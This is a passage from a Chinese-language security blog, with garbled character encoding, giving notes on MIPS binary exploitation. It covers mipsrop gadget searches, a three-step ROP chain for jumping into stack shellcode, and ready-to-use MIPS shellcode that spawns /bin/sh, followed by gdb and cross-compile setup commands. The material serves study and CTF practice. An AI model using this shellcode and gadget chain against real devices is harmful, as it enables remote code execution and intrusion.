<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mipsrop</span></span><br><span class="line"><span class="keyword">import</span> mipsrop</span><br><span class="line">mipsrop=mipsrop.MIPSROPFinder()</span><br><span class="line">mipsrop.find(<span class="string">&quot;&quot;</span>)</span><br><span class="line">mipsrop.stackfinder() <span class="comment">#å¯»æ‰¾æ ˆæ•°æ®å¯æ§çš„ ropï¼Œå»ºç«‹å’Œ a0ã€a1 å¯„å­˜å™¨çš„å…³ç³»</span></span><br><span class="line">mipsrop.summary() <span class="comment">#åˆ—å‡ºæ‰€æœ‰çš„å¯ç”¨ rop</span></span><br><span class="line">mipsrop.system() <span class="comment">#å¯»æ‰¾å‘½ä»¤æ‰§è¡Œçš„çš„rop</span></span><br><span class="line">mipsrop.find(<span class="string">&#x27;jr $ra&#x27;</span>)</span><br><span class="line">mipsrop.find(<span class="string">&quot;move $t9, $s3&quot;</span>)</span><br><span class="line">mipsrop.find(<span class="string">&quot;addiu $a1,$sp&quot;</span>)</span><br></pre></td></tr></table></div></figure>

<p>å¾ˆå¤šå¥½ç”¨ROPçš„å¯åœ¨libcçš„scandir_tailç±»åˆ«å‡½æ•°ä¸‹å¯ä»¥æ‰¾åˆ°</p>

        <h3 id="Shellcodeä¸‰éƒ¨æ›²"   >
          <a href="#Shellcodeä¸‰éƒ¨æ›²" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shellcodeä¸‰éƒ¨æ›²" class="headerlink" title="Shellcodeä¸‰éƒ¨æ›²"></a><code>Shellcode</code>ä¸‰éƒ¨æ›²</h3>
      
        <h4 id="1-gadget1"   >
          <a href="#1-gadget1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-gadget1" class="headerlink" title="(1)gadget1"></a>(1)gadget1</h4>
      <p>ä»spæ§åˆ¶å¯„å­˜å™¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lw ra,0x3c(sp);</span><br><span class="line">lw s3,0x2c(sp);</span><br><span class="line">lw s2,0x28(sp);</span><br><span class="line">lw s1,0x24(sp);</span><br><span class="line">lw s0,0x20(sp);</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªé€šå¸¸å¯ä»¥åœ¨<code>scandir_tail</code>å‡½æ•°ä¸­æ‰¾ï¼Œæˆ–è€…å¦‚ä¸‹</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&#x27;jr $ra&#x27;</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="2-gadget2"   >
          <a href="#2-gadget2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-gadget2" class="headerlink" title="(2)gadget2"></a>(2)gadget2</h4>
      <p>ä»æ ˆå–åœ°å€ç»™å¯„å­˜å™¨ï¼Œç„¶åè·³è½¬ä¹‹å‰æ§åˆ¶ä½çš„å¯„å­˜å™¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addiu a1,0x18(sp);move t9,s3;jalr t9</span><br></pre></td></tr></table></div></figure>

<p>addiuæŒ‡ä»¤å³æ˜¯å–æ ˆåœ°å€åˆ°a1å¯„å­˜å™¨ï¼Œæ–¹ä¾¿ä¹‹åè·³è½¬ï¼Œå¦‚ä¸‹å¯»æ‰¾æŒ‡ä»¤</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&quot;addiu $a1,$sp&quot;</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="3-gadget3"   >
          <a href="#3-gadget3" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-gadget3" class="headerlink" title="(3)gadget3"></a>(3)gadget3</h4>
      <p>è·³è½¬ä¿å­˜æ ˆåœ°å€çš„å¯„å­˜å™¨ï¼Œè¿›å…¥<code>shellcode</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move t9,a1;move a1,a2;jr t9</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹å¯»å€æŒ‡ä»¤</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&quot;move $t9, $s3&quot;</span>)</span><br></pre></td></tr></table></div></figure>

<p>å› ä¸ºä¸€èˆ¬ä¸ŠåŸºæœ¬ä¸å­˜åœ¨ç›´æ¥å–æ ˆåœ°å€ç„¶åè·³è½¬çš„ï¼Œæ‰€ä»¥éœ€è¦å¤šé‡è·³è½¬æ¥å®Œæˆã€‚</p>

        <h2 id="ğŸ”ºå¯ç”¨shellcode"   >
          <a href="#ğŸ”ºå¯ç”¨shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå¯ç”¨shellcode" class="headerlink" title="ğŸ”ºå¯ç”¨shellcode:"></a>ğŸ”ºå¯ç”¨shellcode:</h2>
      
        <h3 id="1-ç›´æ¥å¯ç”¨çš„"   >
          <a href="#1-ç›´æ¥å¯ç”¨çš„" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç›´æ¥å¯ç”¨çš„" class="headerlink" title="(1)ç›´æ¥å¯ç”¨çš„"></a>(1)ç›´æ¥å¯ç”¨çš„</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="comment"># slti $a2, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="comment"># lui $t7, 0x6962         ib</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="comment"># ori $t7, $t7, 0x2f2f    ib//</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="comment"># sw $t7, -0xc($sp)      </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="comment"># lui $t6, 0x6873         hs</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="comment"># ori $t6, $t6, 0x2f6e    hs/n</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="comment"># sw $t6, -8($sp)</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="comment"># sw $zero, -4($sp)</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa4\x27&quot;</span>  <span class="comment"># addiu $a0, $sp, -0xc   //bin/sh</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x05\x28&quot;</span>  <span class="comment"># slti $a1, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xab\x0f\x02\x24&quot;</span>  <span class="comment"># addiu $v0, $zero, 0xfab</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x01\x01\x01&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š"   >
          <a href="#2-ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š" class="headerlink" title="(2)ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š"></a>(2)ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode1 = <span class="string">&quot;\x1c\xfe\xa4\x8f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x20\x28\x40\x02&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x20\x30\x40\x02&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x28\xfe\xa2\x8f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x0c\x01\x01\x01&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>å¯¹åº”çš„å¦‚ä¸‹æ±‡ç¼–ä»£ç ï¼š</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;lw a0,-0x1e4(sp)&quot;</span> 	<span class="comment">#a</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;move a1,s2&quot;</span>			<span class="comment">#a1</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;move a2,s2&quot;</span>			<span class="comment">#a2</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;lw v0,-0x1d8(sp)&quot;</span>	<span class="comment">#v0</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;syscall&quot;</span>			<span class="comment">#syscall</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="6-è°ƒè¯•"   >
          <a href="#6-è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-è°ƒè¯•" class="headerlink" title="6.è°ƒè¯•"></a>6.è°ƒè¯•</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">symbol-file ./Mplogin</span><br><span class="line">target remote 127.0.0.1:12345</span><br></pre></td></tr></table></div></figure>








        <h1 id="ä¸‹è½½åº“"   >
          <a href="#ä¸‹è½½åº“" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‹è½½åº“" class="headerlink" title="ä¸‹è½½åº“"></a>ä¸‹è½½åº“</h1>
      <p>å¼‚æ„ä¸‹è½½åº“</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install crossbuild-essential-*</span><br><span class="line">apt install qemu-user</span><br></pre></td></tr></table></div></figure>

</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/2/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/4/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">133</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">84</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">74</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // å°† XML è½¬ä¸º JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // æœç´¢å¯¹è±¡ï¼ˆæ ‡é¢˜ã€å†…å®¹ï¼‰çš„æƒé‡ï¼Œå½±å“æ˜¾ç¤ºé¡ºåº
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // æ ¹æ®ç©ºç™½å­—ç¬¦åˆ†éš”å…³é”®å­—
        var keywords = searchText.split(/[\s]+/);
        // æœç´¢ç»“æœ
        var matchPosts = [];

        // æœ‰å¤šä¸ªå…³é”®å­—æ—¶ï¼Œå°†åŸæ–‡å­—æ•´ä¸ªä¿å­˜ä¸‹æ¥
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // é˜²æ­¢æœªè¾“å…¥å­—ç¬¦æ—¶æœç´¢
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // æ²¡æœ‰æ ‡é¢˜çš„æ–‡ç« ä½¿ç”¨é¢„è®¾çš„ i18n å˜é‡ä»£æ›¿
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // åˆ é™¤ HTML æ ‡ç­¾ å’Œ æ‰€æœ‰ç©ºç™½å­—ç¬¦
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // åˆ é™¤é‡å¤çš„ /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // æ ‡é¢˜ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var titleHitSlice = [];
            // å†…å®¹ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * è·å–åŒ¹é…çš„å…³é”®è¯çš„ç´¢å¼•
              * @param {String} keyword è¦åŒ¹é…çš„å…³é”®å­—
              * @param {String} text åŸæ–‡å­—
              * @param {Boolean} caseSensitive æ˜¯å¦åŒºåˆ†å¤§å°å†™
              * @param {Number} weight åŒ¹é…å¯¹è±¡çš„æƒé‡ã€‚æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // æ¯æ¬¡åŒ¹é…çš„å¼€å§‹ç´¢å¼•
                var index = -1;     // åŒ¹é…åˆ°çš„ç´¢å¼•å€¼
                var result = [];    // åŒ¹é…ç»“æœ

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // ç´¢å¼•ä½ç½®ç›¸åŒçš„å…³é”®è¯ï¼Œä¿ç•™é•¿åº¦è¾ƒé•¿çš„
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // æŒ‰ç…§åŒ¹é…æ–‡å­—çš„ç´¢å¼•çš„é€’å¢é¡ºåºæ’åº
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * ç»™æ–‡æœ¬ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯æ·»åŠ æ ‡è®°ï¼Œä»è€Œè¿›è¡Œé«˜äº®æ˜¾ç¤º
              * @param {String} text åŸæ–‡æœ¬
              * @param {Array} hitSlice åŒ¹é…é¡¹çš„ç´¢å¼•ä¿¡æ¯
              * @param {Number} start å¼€å§‹ç´¢å¼•
              * @param {Number} end ç»“æŸç´¢å¼•
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // æ–‡ç« æ€»çš„æœç´¢æƒé‡
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„æ ‡é¢˜
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„å†…å®¹
              var postContent;
              // æ˜¾ç¤ºå†…å®¹çš„é•¿åº¦
              var SHOW_WORD_LENGTH = 200;
              // å‘½ä¸­å…³é”®è¯å‰çš„å­—ç¬¦æ˜¾ç¤ºé•¿åº¦
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // æˆªå–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå‰åå…± 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // æœªåŒ¹é…åˆ°å†…å®¹ï¼Œç›´æ¥æˆªå–å‰ 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // æŒ‰æƒé‡é€’å¢çš„é¡ºåºæ’åºï¼Œä½¿æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>